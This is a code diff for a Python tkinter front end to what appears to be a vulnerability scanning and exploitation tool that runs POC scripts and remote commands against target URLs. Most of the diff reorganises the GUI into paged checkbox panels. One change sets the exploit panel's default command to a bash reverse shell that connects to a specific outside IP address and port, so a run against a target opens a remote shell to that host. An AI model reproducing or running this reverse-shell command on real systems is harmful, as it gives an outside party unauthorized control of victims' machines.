@@ -3,7 +3,7 @@ from tkinter import *
 from tkinter import ttk,messagebox,scrolledtext
 import os,sys,time,socket,socks,datetime
 import tkinter.filedialog,importlib,glob
-import threading,ast
+import threading,ast,math
 import urllib3
 import inspect
 import ctypes
@@ -24,6 +24,8 @@ class MyGUI:
         self.size = self.root.geometry('960x650+400+50')#设置窗体大小，850x550是窗体大小，400+50是初始位置
         self.exchange = self.root.resizable(width=False, height=False)#不允许扩大
         self.root.columnconfigure(0, weight=1)
+        #对象属性参数字典
+        self.frms = self.__dict__
         #创建顶级菜单
         self.menubar = Menu(self.root)
         #顶级菜单增加一个普通的命令菜单项
@@ -63,28 +65,39 @@ class MyGUI:
         #定义frame
         self.frmA = Frame(self.frmPOC, width=660, height=30,bg='white')#目标，输入框
         self.frmB = Frame(self.frmPOC, width=660, height=500, bg='white')#输出信息
-        self.frmC = Frame(self.frmPOC, width=660, height=60, bg='white')#功能按钮
+        self.frmC = Frame(self.frmPOC, width=660, height=40, bg='white')#功能按钮
         #self.frmD = Frame(self.root, width=250, height=520)#POC
-        self.frmE = Frame(self.frmPOC, width=300, height=40,bg='white')#
         #创建帆布
-        self.canvas = Canvas(self.frmPOC,width=300,height=590,scrollregion=(0,0,550,550)) #创建canvas
+        #self.canvas = Canvas(self.frmPOC,width=300,height=590,scrollregion=(0,0,550,550)) #创建canvas
         #在帆布上创建frmD
-        self.frmD = Frame(self.canvas,width=300,height=590,bg='white')
-        self.canvas.create_window((0,0), window=self.frmD)#create_window
+        self.frmE = Frame(self.frmPOC, width=300, height=40,bg='white')
+        #创建多个frm, 方便切换存储POC
+        self.frms['frmD_'+str(1)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
+        self.frms['frmD_'+str(2)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
+        self.frms['frmD_'+str(3)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
+        self.frms['frmD_'+str(4)] = Frame(self.frmPOC,width=300,height=500,bg='whitesmoke')
+        for i in range(1,5):
+            #self.frms['frmD_'+str(i)].grid(row=1, column=1, padx=2, pady=2)
+            self.frms['frmD_'+str(i)].grid_propagate(0)
+
+        #self.canvas.create_window((0,0), window=self.frmD)#create_window
+        self.frmF = Frame(self.frmPOC, width=300, height=40,bg='white')#
         #表格布局
         self.frmA.grid(row=0, column=0, padx=2, pady=2)
         self.frmB.grid(row=1, column=0, padx=2, pady=2)
         self.frmC.grid(row=2, column=0, padx=2, pady=2)
-        self.canvas.grid(row=1, column=1, rowspan=3, padx=2, pady=2)
-        self.frmD.grid(row=1, column=1, padx=2, pady=2)
+        #self.canvas.grid(row=1, column=1, rowspan=3, padx=2, pady=2)
         self.frmE.grid(row=0, column=1, padx=2, pady=2)
+        self.frmD_1.grid(row=1, column=1, padx=2, pady=2)
+        self.frmF.grid(row=2, column=1, padx=2, pady=2)
         #固定大小
         self.frmA.grid_propagate(0)
         self.frmB.grid_propagate(0)
         self.frmC.grid_propagate(0)
-        self.frmD.grid_propagate(0)
         self.frmE.grid_propagate(0)
-        self.canvas.grid_propagate(0)
+        self.frmF.grid_propagate(0)
+        #self.canvas.grid_propagate(0)
+        
 
     #创造第一象限
     def CreateFirst(self):
@@ -158,10 +171,21 @@ class MyGUI:
         self.ButtonE2.grid(row=0, column=1,padx=2, pady=2)
         self.ButtonE3.grid(row=0, column=2,padx=2, pady=2)
 
-        self.vbar = Scrollbar(self.canvas, orient=VERTICAL) #竖直滚动条
-        self.vbar.grid(row=1, sticky=S + W + E + N)#允许拖动
-        self.vbar.config(command=self.canvas.yview)
-        self.canvas.config(yscrollcommand = self.vbar.set)
+        #self.vbar = Scrollbar(self.canvas, orient=VERTICAL) #竖直滚动条
+        #self.vbar.grid(row=1, sticky=S + W + E + N)#允许拖动
+        #self.vbar.config(command=self.canvas.yview)
+        #self.canvas.config(yscrollcommand = self.vbar.set)
+
+    def CreateFivth(self):
+        self.ButtonF1 = Button(self.frmF, text='1', width =8, command=lambda:Area_POC(1))
+        self.ButtonF2 = Button(self.frmF, text='2', width =8, command=lambda:Area_POC(2))
+        self.ButtonF3 = Button(self.frmF, text='3', width =8, command=lambda:Area_POC(3))
+        self.ButtonF4 = Button(self.frmF, text='4', width =8, command=lambda:Area_POC(4))
+
+        self.ButtonF1.grid(row=0, column=0,padx=2, pady=2)
+        self.ButtonF2.grid(row=0, column=1,padx=2, pady=2)
+        self.ButtonF3.grid(row=0, column=2,padx=2, pady=2)
+        self.ButtonF4.grid(row=0, column=3,padx=2, pady=2)
     
     def thread_it(self,func,**kwargs):
         self.t = threading.Thread(target=func,kwargs=kwargs)
@@ -182,6 +206,7 @@ class MyGUI:
         self.CreateSecond()
         self.CreateThird()
         self.CreateFourth()
+        self.CreateFivth()
         ###EXP界面组件创建
         #exp = MyEXP(self.root,self.frmEXP)
         #exp.start()
@@ -204,6 +229,7 @@ class TextRedirector(object):
         self.widget.tag_config("pink", foreground="pink")
         self.widget.tag_config("cyan", foreground="cyan")
         self.widget.tag_config("magenta", foreground="magenta")
+        self.widget.tag_config("fuchsia", foreground="fuchsia")
 
     def write(self, str):
         if self.index == "2":###命令执行背景是黑色，字体是绿色。
@@ -230,6 +256,12 @@ class TextRedirector(object):
 
     def flush(self):
         self.widget.update()
+
+    def waitinh(self):
+        self.widget.configure(state="normal")
+        self.widget.insert(END, str, (self.tag,))
+        self.widget.configure(state="disabled")
+        self.widget.see(END)
 
 class TopProxy():
     def __init__(self,root):
@@ -313,6 +345,9 @@ class TopProxy():
             socket.socket=temp
             #print(variable_dict["CheckVar1"].get(),variable_dict["CheckVar2"].get())
             print('[*]禁用代理')
+
+
+
 
 class Loadfile():
     global now_text
@@ -675,7 +710,7 @@ class MyEXP:
 
         self.labelBOT_1 = Label(self.frmBOT_1_1, text="CMD命令")
         self.EntABOT_1 = Entry(self.frmBOT_1_1, width='100',highlightcolor='red', highlightthickness=1,textvariable=EntABOT_1_V,font=("consolas",10)) #接受输入控件
-        self.EntABOT_1.insert(0, "whoami")
+        self.EntABOT_1.insert(0, "bash -i >& /dev/tcp/47.100.137.231/10086 0>&1")
         self.buttonBOT_1 = Button(self.frmBOT_1_1, text="执行命令",command=lambda :self.thread_it(exeCMD,**{"url":EntA_1_V.get(),"cookie":EntA_2_V.get(),"ip":EntA_4_V.get(),"port":EntA_5_V.get(),"cmd":EntABOT_1_V.get(),'pocname':self.comboxlist_3_1.get()}))
         self.buttonBOT_2 = Button(self.frmBOT_1_1, text='清空信息', command=lambda :delText(exp.TexBOT_1_2))
         self.labelBOT_1.grid(row=0, column=0 , padx=2, pady=2,sticky=W)
@@ -894,12 +929,14 @@ def callCheckbutton(x,i):
         print('[*] %s 模块已取消!'%x)
 
 #创建button
-def Create(x,i):
+def Create(frm, x, i):
     global row
     global var
 
     threadLock.acquire()
-    button = Checkbutton(gui.frmD,text=x,command=lambda:callCheckbutton(x,i),variable=var[i])
+    if int(row) > 18:
+        row = 1
+    button = Checkbutton(frm,text=x,command=lambda:callCheckbutton(x,i),variable=var[i])
     button.grid(row=row,sticky=W)
     print(x+'加载成功!')
     row += 1
@@ -907,9 +944,16 @@ def Create(x,i):
 
 #填充线程列表
 def CreateThread():
-    for i in range(len(scripts)):
+    temp_list = []
+    for i in range(1,len(scripts)+1):
+        temp_list.append(str(math.ceil(i/18)))
+    temp_dict = dict(zip(scripts,temp_list))
 
-        thread = threading.Thread(target=Create,args=(scripts[i],i))
+    for i in range(len(scripts)):
+        #scripts_name = scripts[i]
+        thread = threading.Thread(target=Create,
+        args=(gui.frms['frmD_'+ temp_dict[scripts[i]]],
+        scripts[i], i))
 
         thread.setDaemon(True)
         threadList.append(thread)
@@ -1046,6 +1090,9 @@ def BugTest(**kwargs):
         print_result = zip(index_list, file_list, result_list)#合并列表
         tb = pt.PrettyTable()
         tb.field_names = ["Index", "URL", "Result"]
+        #tb.align['Index'] = 'l'
+        tb.align['URL'] = 'l'
+        tb.align['Result'] = 'l'
         for i in print_result:
             tb.add_row(i)
         print(tb)#输出结果
@@ -1095,6 +1142,12 @@ def POC():
     gui.frmPOC.grid()
     sys.stdout = TextRedirector(gui.TexB, "stdout")
     sys.stderr = TextRedirector(gui.TexB, "stderr")
+
+def Area_POC(index):
+    for i in range(1,5):
+        gui.frms['frmD_'+str(i)].grid_remove()
+    gui.frms['frmD_'+str(index)].grid(row=1, column=1, padx=2, pady=2)
+
 
 def delText(text):
     text.configure(state="normal")
